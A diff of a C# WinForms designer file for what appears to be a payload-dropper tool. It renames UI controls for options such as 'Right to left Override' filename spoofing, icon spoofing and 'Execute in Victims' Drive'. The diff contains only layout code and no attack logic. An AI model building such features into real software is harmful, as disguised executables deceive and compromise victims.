@@ -32,20 +32,20 @@
             this.panel1 = new System.Windows.Forms.Panel();
             this.groupBox2 = new System.Windows.Forms.GroupBox();
             this.groupBox6 = new System.Windows.Forms.GroupBox();
-            this.radioButton3 = new System.Windows.Forms.RadioButton();
-            this.radioButton2 = new System.Windows.Forms.RadioButton();
-            this.radioButton1 = new System.Windows.Forms.RadioButton();
+            this.radRTLO = new System.Windows.Forms.RadioButton();
+            this.radOverflow = new System.Windows.Forms.RadioButton();
+            this.radNone = new System.Windows.Forms.RadioButton();
             this.label9 = new System.Windows.Forms.Label();
             this.chkAdminFlag = new System.Windows.Forms.CheckBox();
             this.pnlFileOptGroup = new System.Windows.Forms.Panel();
             this.btnCommand = new System.Windows.Forms.Button();
             this.chkArguments = new System.Windows.Forms.CheckBox();
             this.label5 = new System.Windows.Forms.Label();
-            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.tbArguments = new System.Windows.Forms.TextBox();
             this.chkStreamConsole = new System.Windows.Forms.CheckBox();
             this.chkWaitPayloadFinish = new System.Windows.Forms.CheckBox();
             this.chkConsole = new System.Windows.Forms.CheckBox();
-            this.chkVictExec = new System.Windows.Forms.CheckBox();
+            this.chkVictimExec = new System.Windows.Forms.CheckBox();
             this.imgFileIcon = new System.Windows.Forms.PictureBox();
             this.groupBox4 = new System.Windows.Forms.GroupBox();
             this.btn3rdParty = new System.Windows.Forms.Label();
@@ -128,9 +128,9 @@
             // 
             // groupBox6
             // 
-            this.groupBox6.Controls.Add(this.radioButton3);
-            this.groupBox6.Controls.Add(this.radioButton2);
-            this.groupBox6.Controls.Add(this.radioButton1);
+            this.groupBox6.Controls.Add(this.radRTLO);
+            this.groupBox6.Controls.Add(this.radOverflow);
+            this.groupBox6.Controls.Add(this.radNone);
             this.groupBox6.ForeColor = System.Drawing.Color.White;
             this.groupBox6.Location = new System.Drawing.Point(8, 122);
             this.groupBox6.Name = "groupBox6";
@@ -139,37 +139,37 @@
             this.groupBox6.TabStop = false;
             this.groupBox6.Text = "File Name Spoofing";
             // 
-            // radioButton3
+            // radRTLO
             // 
-            this.radioButton3.AutoSize = true;
-            this.radioButton3.Location = new System.Drawing.Point(142, 13);
-            this.radioButton3.Name = "radioButton3";
-            this.radioButton3.Size = new System.Drawing.Size(134, 17);
-            this.radioButton3.TabIndex = 2;
-            this.radioButton3.Text = "Right to left Override";
-            this.radioButton3.UseVisualStyleBackColor = true;
+            this.radRTLO.AutoSize = true;
+            this.radRTLO.Location = new System.Drawing.Point(142, 13);
+            this.radRTLO.Name = "radRTLO";
+            this.radRTLO.Size = new System.Drawing.Size(134, 17);
+            this.radRTLO.TabIndex = 2;
+            this.radRTLO.Text = "Right to left Override";
+            this.radRTLO.UseVisualStyleBackColor = true;
             // 
-            // radioButton2
+            // radOverflow
             // 
-            this.radioButton2.AutoSize = true;
-            this.radioButton2.Location = new System.Drawing.Point(64, 13);
-            this.radioButton2.Name = "radioButton2";
-            this.radioButton2.Size = new System.Drawing.Size(72, 17);
-            this.radioButton2.TabIndex = 1;
-            this.radioButton2.Text = "Overflow";
-            this.radioButton2.UseVisualStyleBackColor = true;
+            this.radOverflow.AutoSize = true;
+            this.radOverflow.Location = new System.Drawing.Point(64, 13);
+            this.radOverflow.Name = "radOverflow";
+            this.radOverflow.Size = new System.Drawing.Size(72, 17);
+            this.radOverflow.TabIndex = 1;
+            this.radOverflow.Text = "Overflow";
+            this.radOverflow.UseVisualStyleBackColor = true;
             // 
-            // radioButton1
+            // radNone
             // 
-            this.radioButton1.AutoSize = true;
-            this.radioButton1.Checked = true;
-            this.radioButton1.Location = new System.Drawing.Point(5, 13);
-            this.radioButton1.Name = "radioButton1";
-            this.radioButton1.Size = new System.Drawing.Size(53, 17);
-            this.radioButton1.TabIndex = 0;
-            this.radioButton1.TabStop = true;
-            this.radioButton1.Text = "None";
-            this.radioButton1.UseVisualStyleBackColor = true;
+            this.radNone.AutoSize = true;
+            this.radNone.Checked = true;
+            this.radNone.Location = new System.Drawing.Point(5, 13);
+            this.radNone.Name = "radNone";
+            this.radNone.Size = new System.Drawing.Size(53, 17);
+            this.radNone.TabIndex = 0;
+            this.radNone.TabStop = true;
+            this.radNone.Text = "None";
+            this.radNone.UseVisualStyleBackColor = true;
             // 
             // label9
             // 
@@ -195,11 +195,11 @@
             this.pnlFileOptGroup.Controls.Add(this.btnCommand);
             this.pnlFileOptGroup.Controls.Add(this.chkArguments);
             this.pnlFileOptGroup.Controls.Add(this.label5);
-            this.pnlFileOptGroup.Controls.Add(this.textBox1);
+            this.pnlFileOptGroup.Controls.Add(this.tbArguments);
             this.pnlFileOptGroup.Controls.Add(this.chkStreamConsole);
             this.pnlFileOptGroup.Controls.Add(this.chkWaitPayloadFinish);
             this.pnlFileOptGroup.Controls.Add(this.chkConsole);
-            this.pnlFileOptGroup.Controls.Add(this.chkVictExec);
+            this.pnlFileOptGroup.Controls.Add(this.chkVictimExec);
             this.pnlFileOptGroup.Location = new System.Drawing.Point(5, 13);
             this.pnlFileOptGroup.Name = "pnlFileOptGroup";
             this.pnlFileOptGroup.Size = new System.Drawing.Size(216, 100);
@@ -238,12 +238,12 @@
             this.label5.TabIndex = 9;
             this.label5.Text = "└";
             // 
-            // textBox1
+            // tbArguments
             // 
-            this.textBox1.Location = new System.Drawing.Point(90, 1);
-            this.textBox1.Name = "textBox1";
-            this.textBox1.Size = new System.Drawing.Size(119, 22);
-            this.textBox1.TabIndex = 14;
+            this.tbArguments.Location = new System.Drawing.Point(90, 1);
+            this.tbArguments.Name = "tbArguments";
+            this.tbArguments.Size = new System.Drawing.Size(119, 22);
+            this.tbArguments.TabIndex = 14;
             // 
             // chkStreamConsole
             // 
@@ -275,15 +275,15 @@
             this.chkConsole.Text = "Execute in Command Prompt";
             this.chkConsole.UseVisualStyleBackColor = true;
             // 
-            // chkVictExec
+            // chkVictimExec
             // 
-            this.chkVictExec.AutoSize = true;
-            this.chkVictExec.Location = new System.Drawing.Point(3, 67);
-            this.chkVictExec.Name = "chkVictExec";
-            this.chkVictExec.Size = new System.Drawing.Size(149, 17);
-            this.chkVictExec.TabIndex = 10;
-            this.chkVictExec.Text = "Execute in Victims\' Drive";
-            this.chkVictExec.UseVisualStyleBackColor = true;
+            this.chkVictimExec.AutoSize = true;
+            this.chkVictimExec.Location = new System.Drawing.Point(3, 67);
+            this.chkVictimExec.Name = "chkVictimExec";
+            this.chkVictimExec.Size = new System.Drawing.Size(149, 17);
+            this.chkVictimExec.TabIndex = 10;
+            this.chkVictimExec.Text = "Execute in Victims\' Drive";
+            this.chkVictimExec.UseVisualStyleBackColor = true;
             // 
             // imgFileIcon
             // 
@@ -318,11 +318,11 @@
             // 
             this.btn3rdParty.AutoSize = true;
             this.btn3rdParty.Cursor = System.Windows.Forms.Cursors.Hand;
-            this.btn3rdParty.Location = new System.Drawing.Point(118, 169);
+            this.btn3rdParty.Location = new System.Drawing.Point(167, 169);
             this.btn3rdParty.Name = "btn3rdParty";
-            this.btn3rdParty.Size = new System.Drawing.Size(94, 13);
+            this.btn3rdParty.Size = new System.Drawing.Size(45, 13);
             this.btn3rdParty.TabIndex = 21;
-            this.btn3rdParty.Text = "[3rd Party Notice]";
+            this.btn3rdParty.Text = "[About]";
             // 
             // imgCharacter
             // 
@@ -349,7 +349,7 @@
             // 
             this.btnGitSauce.AutoSize = true;
             this.btnGitSauce.Cursor = System.Windows.Forms.Cursors.Hand;
-            this.btnGitSauce.Location = new System.Drawing.Point(29, 169);
+            this.btnGitSauce.Location = new System.Drawing.Point(78, 169);
             this.btnGitSauce.Name = "btnGitSauce";
             this.btnGitSauce.Size = new System.Drawing.Size(83, 13);
             this.btnGitSauce.TabIndex = 18;
@@ -706,7 +706,7 @@
         private System.Windows.Forms.PictureBox imgFileIcon;
         private System.Windows.Forms.GroupBox groupBox3;
         private System.Windows.Forms.GroupBox groupBox2;
-        private System.Windows.Forms.CheckBox chkVictExec;
+        private System.Windows.Forms.CheckBox chkVictimExec;
         private System.Windows.Forms.GroupBox groupBox1;
         private System.Windows.Forms.Label lblDbg;
         private System.Windows.Forms.CheckBox chkAdminFlag;
@@ -727,15 +727,15 @@
         private System.Windows.Forms.Label label2;
         private System.Windows.Forms.Button btn_RefreshDrives;
         private System.Windows.Forms.CheckBox chkArguments;
-        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.TextBox tbArguments;
         private System.Windows.Forms.Panel pnlFileOptGroup;
         private System.Windows.Forms.Label label9;
         private System.Windows.Forms.Button btnCommand;
         private System.Windows.Forms.GroupBox groupBox5;
         private System.Windows.Forms.GroupBox groupBox6;
-        private System.Windows.Forms.RadioButton radioButton3;
-        private System.Windows.Forms.RadioButton radioButton2;
-        private System.Windows.Forms.RadioButton radioButton1;
+        private System.Windows.Forms.RadioButton radRTLO;
+        private System.Windows.Forms.RadioButton radOverflow;
+        private System.Windows.Forms.RadioButton radNone;
         private System.Windows.Forms.OpenFileDialog ofdSpoof;
         private System.Windows.Forms.Label btn3rdParty;
     }
